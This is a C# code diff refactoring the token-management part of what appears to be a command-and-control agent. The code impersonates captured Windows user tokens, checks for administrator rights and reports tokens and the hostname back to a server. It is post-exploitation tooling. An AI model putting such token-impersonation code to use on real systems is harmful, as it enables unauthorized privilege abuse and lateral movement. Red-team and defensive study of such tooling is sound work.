@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32.SafeHandles;
+using Microsoft.Win32.SafeHandles;
 using System.Text.Json;
 using System.Security.Principal;
 using Agent.Models;
@@ -16,14 +16,8 @@ namespace Agent.Managers
             this.logger = logger;
         }
 
-        public bool Impersonate(int i)
-        {
-            if (tokens.ContainsKey(i))
-            {
-                return Native.ImpersonateLoggedOnUser(tokens[i]);
-            }
-            return false;
-        }
+        public bool Impersonate(int i) =>
+            tokens.TryGetValue(i, out SafeAccessTokenHandle? token) && Native.ImpersonateLoggedOnUser(token);
 
         public void RunTaskImpersonated(IPlugin plug, ServerJob job)
         {
@@ -50,11 +44,9 @@ namespace Agent.Managers
 
         public string List(ServerJob job)
         {
-            Dictionary<string, string> toks = new Dictionary<string, string>();
-            foreach (var token in tokens)
-            {
-                toks.Add(token.Key.ToString(), token.Value.DangerousGetHandle().ToString());
-            }
+            Dictionary<string, string> toks = tokens.ToDictionary(
+                token => token.Key.ToString(),
+                token => token.Value.DangerousGetHandle().ToString());
 
             return new TaskResponse()
             {
@@ -64,41 +56,28 @@ namespace Agent.Managers
             }.ToJson();
         }
 
-        public bool Revert()
-        {
-            return Native.RevertToSelf();
-        }
+        public bool Revert() => Native.RevertToSelf();
 
         public int getIntegrity()
         {
-            bool isAdmin;
-            using (var identity = WindowsIdentity.GetCurrent())
-            {
-                var principal = new WindowsPrincipal(identity);
-                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
-            }
-
-            return isAdmin ? 3 : 2;
+            using var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator) ? 3 : 2;
         }
 
         public TokenTaskResponse AddToken(SafeAccessTokenHandle hToken, CreateToken tokenOptions, string task_id)
         {
+            string[] split = tokenOptions.username.Split('@');
             Token token = new Token()
             {
                 action = "add",
                 Handle = hToken.DangerousGetHandle().ToInt64(),
                 description = tokenOptions.name,
-                token_id = tokens.Count + 1
+                token_id = tokens.Count + 1,
+                user = split.Length > 1
+                    ? $"{split[1]}\\{split[0]}"
+                    : $"{tokenOptions.domain}\\{tokenOptions.username}",
             };
-            if (tokenOptions.username.Contains("@"))
-            {
-                string[] split = tokenOptions.username.Split('@');
-                token.user = $"{split[1]}\\{split[0]}";
-            }
-            else
-            {
-                token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
-            }
 
             tokens.Add(token.token_id, hToken);
 
@@ -108,19 +87,18 @@ namespace Agent.Managers
                 user_output = "Created.",
                 task_id = task_id,
                 tokens = new List<Token>() { token },
-                callback_tokens = new List<CallbackToken> { new CallbackToken()
+                callback_tokens = new List<CallbackToken>
                 {
-                    action = "add",
-                    host = System.Net.Dns.GetHostName(),
-                    token_id = token.token_id,
-                } }
-
+                    new CallbackToken()
+                    {
+                        action = "add",
+                        host = System.Net.Dns.GetHostName(),
+                        token_id = token.token_id,
+                    }
+                }
             };
         }
 
-        public SafeAccessTokenHandle GetImpersonationContext(int id)
-        {
-            return tokens[id];
-        }
+        public SafeAccessTokenHandle GetImpersonationContext(int id) => tokens[id];
     }
 }
